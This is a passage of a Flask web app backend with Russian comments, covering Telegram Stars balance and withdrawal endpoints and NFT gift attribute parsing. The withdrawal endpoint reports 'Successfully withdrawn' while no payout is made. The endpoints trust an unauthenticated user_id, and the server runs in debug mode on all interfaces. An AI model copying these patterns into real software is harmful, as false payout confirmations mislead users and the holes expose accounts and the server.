                                symbol_match = re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE)
                                if symbol_match and not attributes['symbol']:
                                    attributes['symbol'] = symbol_match.group(1).strip()
                            
                            elif re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE):
                                backdrop_match = re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE)
                                if backdrop_match and not attributes['backdrop']:
                                    attributes['backdrop'] = backdrop_match.group(1).strip()
                
        except Exception as e:
            logger.warning(f"Error parsing NFT attributes from {gift_link}: {e}")
        
        return jsonify({
            'success': True,
            'data': attributes
        })
        
    except Exception as e:
        logger.error(f"Error getting NFT attributes: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

# Страница звезд (из главного меню)
@app.route('/stars')
def stars_page():
    """Страница звезд из главного меню"""
    return render_template('stars.html')

# Страница вывода звезд после авторизации
@app.route('/withdraw')
def withdraw_page():
    """Страница выбора количества звезд для вывода после авторизации"""
    return render_template('withdraw.html')

# API для получения баланса пользователя
@app.route('/api/user/balance', methods=['GET'])
def get_user_balance_api():
    """Возвращает баланс пользователя"""
    try:
        user_id = request.args.get('user_id')
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'}), 400
        
        # Для фейкового тестового номера возвращаем тестовый баланс
        session_data = load_session_data(user_id)
        if session_data.get('is_fake') or session_data.get('phone') == FAKE_TEST_PHONE:
            return jsonify({
                'success': True,
                'balance': 2500  # Тестовый баланс
            })
        
        # Получаем реальный баланс из базы данных
        balance = get_user_balance(user_id)
        return jsonify({
            'success': True,
            'balance': balance
        })
    except Exception as e:
        logger.error(f"Error getting user balance: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

# API для вывода звезд
@app.route('/api/withdraw/stars', methods=['POST'])
def withdraw_stars():
    """Обрабатывает запрос на вывод звезд"""
    try:
        data = request.json or {}
        user_id = data.get('user_id')
        amount = data.get('amount')
        
        if not user_id or not amount:
            return jsonify({'success': False, 'error': 'User ID and amount required'}), 400
        
        # Проверяем, что amount - положительное число
        try:
            amount = int(amount)
            if amount <= 0:
                return jsonify({'success': False, 'error': 'Amount must be positive'}), 400
        except (ValueError, TypeError):
            return jsonify({'success': False, 'error': 'Invalid amount'}), 400
        
        # Для фейкового тестового номера просто возвращаем успех
        session_data = load_session_data(user_id)
        if session_data.get('is_fake') or session_data.get('phone') == FAKE_TEST_PHONE:
            logger.info(f"Фейковый вывод {amount} звезд для тестового пользователя {user_id}")
            return jsonify({
                'success': True,
                'message': f'Successfully withdrawn {amount} stars',
                'fake': True
            })
        
        # Получаем текущий баланс
        current_balance = get_user_balance(user_id)
        
        # Проверяем достаточность средств
        if amount > current_balance:
            return jsonify({
                'success': False,
                'error': f'Insufficient balance. Available: {current_balance} stars'
            }), 400
        
        # Здесь должна быть реальная логика вывода звезд
        # Пока просто логируем
        logger.info(f"Запрос на вывод {amount} звезд для пользователя {user_id}")
        
        # TODO: Реализовать реальную логику вывода через Telegram Stars API
        # Для демо просто возвращаем успех
        return jsonify({
            'success': True,
            'message': f'Successfully withdrawn {amount} stars'
        })
        
    except Exception as e:
        logger.error(f"Error withdrawing stars: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
